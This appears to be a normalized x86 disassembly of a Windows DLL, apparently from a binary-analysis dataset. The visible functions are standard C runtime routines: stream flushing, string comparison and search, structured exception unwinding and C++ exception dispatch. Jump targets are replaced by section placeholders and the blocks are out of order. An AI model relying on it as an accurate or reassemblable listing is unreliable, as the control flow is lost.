mov esi [ ebp + 0xc ]
push esi
call sub_1000ca19
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1000ba8b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_1000c945
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_1000f0bb
pop ecx
test eax eax
jne r-xdata
call sub_1000ba8b
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1000c945
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000f072
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_1000ef88
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10010720
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100107a0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_10010790
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10010864
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001089d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_100108f1
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001183f
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10010927
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10008bf6
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001183f
add esp 0x20
pop esi
pop ebp
retn
sub_1001095a
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10010a31
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1000d892
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_10010a31
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10008bf6
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001183f
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001095a
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001089d
pop ebx
leave
retn
sub_10010ad0
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1000e271
call sub_1000e271
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_10010b43
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1000d892
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1000d892
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_10010b6f
mov edi edi
push ebp
mov ebp esp
call sub_1000d892
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10010b96
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000d892
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1000d892
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1000d892
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1000e271
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_10010be8
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_10010927
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10011930
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10010c53
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008ce9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10008d40
pop ecx
sub_10010c7a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1000a1b0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_10010cd9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1000d892
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1000d892
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1000d892
and [ eax + 0x90 ] 0x0
jmp sub_1000e225
sub_10010d28
push 0x10
push r--data
call sub_1000bc40
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010dea
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1000d892
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1000bc85
retn
call sub_1000e271
call sub_1000e271
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_10011930
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10010e04
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1000d892
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_10010e49
push 0x8
push r--data
call sub_1000bc40
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1000bc85
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10010896
mov [ ebp - 0x4 ] 0xfffffffe
sub_10010e9e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_10010ec7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_1000e271
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_10010c7a
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_10010f8b
push 0x2c
push r--data
call sub_1000bc40
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10010b43
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1000d892
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1000d892
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1000d892
mov [ eax + 0x88 ] esi
call sub_1000d892
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_10010be8
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_100110b1
mov eax [ ebp - 0x1c ]
call sub_1000bc85
retn
sub_10011024
mov esp [ ebp - 0x18 ]
call sub_1000d892
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_10010d28
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_100110b1
mov eax [ ebp - 0x1c ]
call sub_1000bc85
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_100110b1
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10010b96
pop ecx
call sub_1000d892
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1000d892
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_10010b6f
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10010e49
pop ecx
pop ecx
sub_10011127
push 0xc
push r--data
call sub_1000bc40
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000e271
push ebx
push esi
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_100119b2
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10008e20
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_100119b2
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_10010e9e
pop ecx
pop ecx
push eax
push esi
call sub_10008e20
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1000bc85
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_10010e9e
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_100112a6
push 0x8
push r--data
call sub_1000bc40
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10010e9e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10010896
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_10011127
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bc85
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10010e9e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10010896
jmp r-xdata
sub_10011338
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_100112a6
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10010864
call sub_1001089d
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_10010d28
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_10010f8b
add esp 0x28
test eax eax
je r-xdata
sub_100113a6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1000d892
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1000d892
lea edi [ eax + 0x80 ]
call sub_1000d6e2
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10010ad0
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_1000e271
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001095a
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10011338
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_100114ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1000e271
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1000d892
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1000e271
call sub_1000e225
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100113a6
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1000d892
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
